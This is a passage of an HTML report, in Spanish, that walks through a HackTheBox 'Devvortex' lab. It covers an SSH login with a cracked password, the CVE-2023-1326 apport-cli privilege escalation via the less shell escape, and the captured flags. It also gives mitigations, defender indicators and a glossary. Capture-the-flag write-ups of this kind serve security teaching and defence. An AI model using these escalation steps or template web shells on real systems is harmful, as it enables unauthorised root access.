+  <!-- PASO 4: SSH -->
+  <div class="step-box">
+    <div class="step-title"><span class="step-num">4</span> SSH como logan → User Flag</div>
+    <div class="code-block">
+      <div class="code-label">SSH Login</div>
+      <div class="code-body"><span class="cmd">sshpass</span> <span class="param">-p</span> '<span class="flag-hl">tequieromucho</span>' <span class="cmd">ssh</span> <span class="user">logan</span>@<span class="ip">10.129.229.146</span> "cat ~/user.txt"
+
+<span class="flag-hl">3a3ee8221f9dd3225cc41d69c3cef645</span></div>
+    </div>
+  </div>
+
+  <!-- PASO 5: PrivEsc -->
+  <div class="step-box">
+    <div class="step-title"><span class="step-num">5</span> CVE-2023-1326 — apport-cli Privilege Escalation</div>
+    <div class="why-box">
+      <div class="why-label">¿Cómo funciona apport-cli?</div>
+      <code>apport-cli</code> es la herramienta de reporte de crashes de Ubuntu. Cuando se ejecuta con <code>sudo</code>, recolecta información del proceso indicado y ofrece opciones: Enviar, Ver, Cancelar. La opción "View" abre el reporte en el pager <code>less</code> ejecutado como root. En <code>less</code>, el carácter <code>!</code> permite ejecutar comandos del sistema — <code>!/bin/bash</code> lanza un shell root.
+    </div>
+    <div class="code-block">
+      <div class="code-label">Exploit CVE-2023-1326</div>
+      <div class="code-body"><span class="comment"># 1. Verificar sudo -l</span>
+<span class="cmd">sudo -l</span>
+<span class="output">User logan may run the following commands on devvortex:
+    <span class="success">(ALL : ALL) /usr/bin/apport-cli</span></span>
+
+<span class="comment"># 2. Generar crash report del proceso actual ($$)</span>
+<span class="cmd">sudo</span> /usr/bin/<span class="highlight">apport-cli</span> <span class="param">-f -P</span> <span class="highlight">$$</span>
+
+<span class="output">*** Collecting problem information...
+Please choose (S/V/K/I/C): <span class="success">V</span>  ← elegir View</span>
+
+<span class="comment"># 3. En less (ejecutado como root):</span>
+<span class="highlight">!/bin/bash</span>  <span class="comment">← escape al shell</span>
+
+<span class="output"><span class="success">root@devvortex:/home/logan#</span> cat /root/root.txt
+<span class="flag-hl">7ae0c867534cba6cf27335d3287185ef</span></span></div>
+    </div>
+    <div class="interpret-box">
+      <div class="int-label">¿Por qué funciona?</div>
+      <code>less</code> tiene una función de ejecución de comandos del shell con el prefijo <code>!</code>. Como <code>apport-cli</code> llama a <code>less</code> con los privilegios del proceso padre (root en este caso), cualquier comando ejecutado desde <code>less</code> hereda esos privilegios. El parámetro <code>LESSSECURE</code> no estaba configurado.
+    </div>
+  </div>
+</div>
+
+<!-- 6. FLAGS -->
+<div class="section" id="flags">
+  <div class="section-header">
+    <div class="section-number">6</div>
+    <h2>Flags Capturadas</h2>
+  </div>
+  <div class="flag-box">
+    <div class="flag-icon">🚩</div>
+    <div>
+      <div class="flag-label">User Flag — /home/logan/user.txt</div>
+      <div class="flag-value">3a3ee8221f9dd3225cc41d69c3cef645</div>
+    </div>
+  </div>
+  <div class="flag-box">
+    <div class="flag-icon">👑</div>
+    <div>
+      <div class="flag-label">Root Flag — /root/root.txt</div>
+      <div class="flag-value">7ae0c867534cba6cf27335d3287185ef</div>
+    </div>
+  </div>
+</div>
+
+<!-- 7. RECOMENDACIONES -->
+<div class="section" id="recs">
+  <div class="section-header">
+    <div class="section-number">7</div>
+    <h2>Recomendaciones de Mitigación</h2>
+  </div>
+  <div class="rec-grid">
+    <div class="rec-card">
+      <div class="rec-priority critical">CRÍTICO</div>
+      <h4>Actualizar Joomla a 4.2.8+</h4>
+      <p>La versión 4.2.8 parchea CVE-2023-23752 añadiendo verificación de autenticación al endpoint de configuración de la API. Actualización inmediata requerida.</p>
+    </div>
+    <div class="rec-card">
+      <div class="rec-priority critical">CRÍTICO</div>
+      <h4>Aplicar patch apport-cli (CVE-2023-1326)</h4>
+      <p>Actualizar <code>apport</code> a versión 2.26.0+. Evitar añadir <code>apport-cli</code> a sudoers. Si es necesario, configurar <code>LESSSECURE=1</code> para deshabilitar ejecución de comandos en less.</p>
+    </div>
+    <div class="rec-card">
+      <div class="rec-priority high">ALTO</div>
+      <h4>Separar credenciales de DB del Admin</h4>
+      <p>Las credenciales del usuario de base de datos no deberían ser las mismas que las del administrador de Joomla. Principio de menor privilegio para cuentas de DB.</p>
+    </div>
+    <div class="rec-card">
+      <div class="rec-priority high">ALTO</div>
+      <h4>Deshabilitar edición de templates en producción</h4>
+      <p>El editor de templates PHP de Joomla permite RCE a cualquier administrador. Considerar ACLs más granulares o deshabilitar esta funcionalidad en entornos de producción.</p>
+    </div>
+    <div class="rec-card">
+      <div class="rec-priority medium">MEDIO</div>
+      <h4>Separar entornos dev/prod</h4>
+      <p>El subdominio <code>dev.*</code> estaba expuesto públicamente con el mismo CMS y credenciales. Los entornos de desarrollo deben estar en redes privadas o protegidos con autenticación adicional.</p>
+    </div>
+    <div class="rec-card">
+      <div class="rec-priority medium">MEDIO</div>
+      <h4>Política de contraseñas más robusta</h4>
+      <p>La contraseña de logan (<code>tequieromucho</code>) es una palabra del diccionario en español. Implementar política de contraseñas que requiera complejidad y detecte frases comunes.</p>
+    </div>
+  </div>
+</div>
+
+<!-- 8. LECCIONES -->
+<div class="section" id="lessons">
+  <div class="section-header">
+    <div class="section-number">8</div>
+    <h2>Lecciones Aprendidas</h2>
+  </div>
+
+  <h3 style="color:var(--accent); font-size:14px; margin-bottom:12px;">Para el atacante</h3>
+  <ul style="color:var(--text-dim); padding-left:20px; margin-bottom:20px;">
+    <li style="margin-bottom:8px;">Cuando hay Joomla 4.x, probar CVE-2023-23752 <em>antes</em> de cualquier brute force — es un one-liner que da admin si la versión es vulnerable.</li>
+    <li style="margin-bottom:8px;">El prefijo de tabla Joomla (<code>sd4fg_</code>) es visible en el JSON del CVE. Usarlo directamente para el query MySQL.</li>
+    <li style="margin-bottom:8px;">En Python requests con redirects a hostnames no resolvibles, implementar <code>ForcedIPAdapter</code> que reescriba la URL a la IP antes de enviar.</li>
+    <li style="margin-bottom:8px;">El save de templates en Joomla requiere <code>jform[source]</code> (no <code>source</code>) y la URL del POST debe incluir <code>view=template&amp;file=...&amp;isMedia=0</code>.</li>
+    <li style="margin-bottom:8px;">Para crackear bcrypt rapidamente: verificar con Python <code>bcrypt.checkpw()</code> en lugar de esperar a john con rockyou (mucho más lento).</li>
+    <li style="margin-bottom:8px;"><code>sudo -l</code> siempre primer paso en Linux tras obtener shell. <code>apport-cli</code> → CVE-2023-1326 es un privesc de un paso.</li>
+  </ul>
+
+  <h3 style="color:var(--red); font-size:14px; margin-bottom:12px;">Para el defensor (IOCs)</h3>
+  <ul style="color:var(--text-dim); padding-left:20px;">
+    <li style="margin-bottom:8px;">Request a <code>/api/index.php/v1/config/application?public=true</code> sin Authorization header → CVE-2023-23752</li>
+    <li style="margin-bottom:8px;">Múltiples POSTs a <code>/administrator/index.php?option=com_templates&amp;task=template.apply</code></li>
+    <li style="margin-bottom:8px;">Acceso a <code>/templates/cassiopeia/cassiopeia/error.php</code> con parámetro <code>cmd=</code></li>
+    <li style="margin-bottom:8px;">Proceso <code>apport-cli</code> lanzado con sudo seguido inmediatamente de proceso <code>bash</code> hijo de <code>less</code></li>
+  </ul>
+</div>
+
+<!-- 9. GLOSARIO -->
+<div class="section" id="glossary">
+  <div class="section-header">
+    <div class="section-number">9</div>
+    <h2>Glosario</h2>
+  </div>
+  <table>
+    <thead>
+      <tr><th>Término</th><th>Definición</th></tr>
+    </thead>
+    <tbody>
+      <tr><td><strong>CVE-2023-23752</strong></td><td>Vulnerabilidad en Joomla 4.0–4.2.7 que expone la configuración (incluyendo credenciales de DB) a través de la API REST sin requerir autenticación.</td></tr>
+      <tr><td><strong>CVE-2023-1326</strong></td><td>Vulnerabilidad en apport-cli (&lt;2.26.0) que permite escalada de privilegios cuando se ejecuta con sudo, abusando del pager <code>less</code> para ejecutar comandos como root.</td></tr>
+      <tr><td><strong>Virtual Host (vhost)</strong></td><td>Configuración de servidor web donde múltiples dominios/subdominios sirven contenido diferente desde la misma IP. Requiere usar el header <code>Host:</code> correcto.</td></tr>
+      <tr><td><strong>Template Editor (Joomla)</strong></td><td>Funcionalidad del backend de Joomla que permite editar directamente los archivos PHP del template activo. Esencialmente permite RCE a cualquier administrador.</td></tr>
+      <tr><td><strong>ForcedIPAdapter</strong></td><td>Técnica Python para redirigir todas las requests HTTP a una IP específica independientemente del hostname, útil cuando no se puede modificar /etc/hosts.</td></tr>
+      <tr><td><strong>bcrypt ($2y$)</strong></td><td>Algoritmo de hash de contraseñas diseñado para ser lento (resistente a brute force). PHP usa prefijo $2y$; Python usa $2b$ — son compatibles con replace.</td></tr>
+      <tr><td><strong>apport-cli</strong></td><td>Herramienta de reporte de crashes de Ubuntu. Si está en sudoers, es un vector de privesc conocido (CVE-2023-1326) via escape en el pager less.</td></tr>
+      <tr><td><strong>less</strong></td><td>Pager de Unix para ver archivos. Permite ejecutar comandos del shell con el prefijo <code>!</code>. Si se ejecuta con privilegios elevados, otorga esos privilegios al shell invocado.</td></tr>
+    </tbody>
+  </table>
+</div>
+
+</div><!-- /main-col -->
+
+<!-- SIDEBAR -->
+<div class="sidebar">
+<div class="sidebar-sticky">
+
+  <div class="sidebar-card">
+    <h3>Target Info</h3>
+    <div class="info-row"><span class="info-key">IP</span><span class="info-val">10.129.229.146</span></div>
+    <div class="info-row"><span class="info-key">OS</span><span class="info-val">Ubuntu 20.04.6</span></div>
+    <div class="info-row"><span class="info-key">Web</span><span class="info-val">nginx 1.18.0</span></div>
+    <div class="info-row"><span class="info-key">CMS</span><span class="info-val">Joomla 4.2.6</span></div>
+    <div class="info-row"><span class="info-key">DB</span><span class="info-val">MySQL / joomla</span></div>
+    <div class="info-row"><span class="info-key">User</span><span class="info-val">logan / www-data</span></div>
+    <div class="info-row"><span class="info-key">Root</span><span class="info-val">apport-cli CVE</span></div>
+  </div>
+
+  <div class="sidebar-card">
+    <h3>Herramientas</h3>
+    <ul class="tool-list">
+      <li>nmap — port scanning</li>
+      <li>gobuster — vhost enum</li>
+      <li>curl — CVE exploit</li>
+      <li>python3 requests — Joomla login</li>
+      <li>mysql — DB dump</li>
+      <li>python3 bcrypt — hash verify</li>
+      <li>sshpass — SSH login</li>
+      <li>expect — apport-cli exploit</li>
+    </ul>
+  </div>
+
+  <div class="sidebar-card">
+    <h3>Tabla de Contenidos</h3>
+    <ul class="toc-list">
+      <li><a href="#desc">1. Descripción</a></li>
+      <li><a href="#recon">2. Reconocimiento</a></li>
+      <li><a href="#vulns">3. Vulnerabilidades</a></li>
+      <li><a href="#timeline">4. Timeline</a></li>
+      <li><a href="#exploit">5. Explotación</a></li>
+      <li><a href="#flags">6. Flags</a></li>
+      <li><a href="#recs">7. Recomendaciones</a></li>
+      <li><a href="#lessons">8. Lecciones</a></li>
+      <li><a href="#glossary">9. Glosario</a></li>
+    </ul>
+  </div>
+
+  <div class="sidebar-card">
+    <h3>MITRE ATT&CK</h3>
+    <div class="mitre-item"><span class="mitre-id">T1190</span><span class="mitre-name">Exploit Public-Facing App (CVE-2023-23752)</span></div>
+    <div class="mitre-item"><span class="mitre-id">T1078</span><span class="mitre-name">Valid Accounts — Joomla admin credentials</span></div>
+    <div class="mitre-item"><span class="mitre-id">T1505.003</span><span class="mitre-name">Web Shell — PHP template injection</span></div>
+    <div class="mitre-item"><span class="mitre-id">T1555</span><span class="mitre-name">Credentials from DB — MySQL hash dump</span></div>
+    <div class="mitre-item"><span class="mitre-id">T1552.001</span><span class="mitre-name">Credentials in Files — bcrypt hash crack</span></div>
+    <div class="mitre-item"><span class="mitre-id">T1548.003</span><span class="mitre-name">Sudo and Sudo Caching — apport-cli CVE-2023-1326</span></div>
+  </div>
+
+  <div class="sidebar-card">
+    <h3>Credenciales</h3>
+    <div class="artifact-card">
+      <div class="artifact-icon">🔑</div>
+      <div><div class="artifact-name">lewis</div><div class="artifact-desc">P4ntherg0t1n5r3c0n## (Joomla admin + MySQL)</div></div>
+    </div>
+    <div class="artifact-card">
+      <div class="artifact-icon">🔑</div>
+      <div><div class="artifact-name">logan</div><div class="artifact-desc">tequieromucho (SSH user — bcrypt cracked)</div></div>
+    </div>
+  </div>
+
+</div>
+</div><!-- /sidebar -->
+</div><!-- /container -->
+
+<footer>
+  <p>Ghost-Ops Report | Devvortex — HTB Easy Linux | 2026-03-21 | <span>100% pwned</span></p>
+</footer>
+
+</body>
+</html>
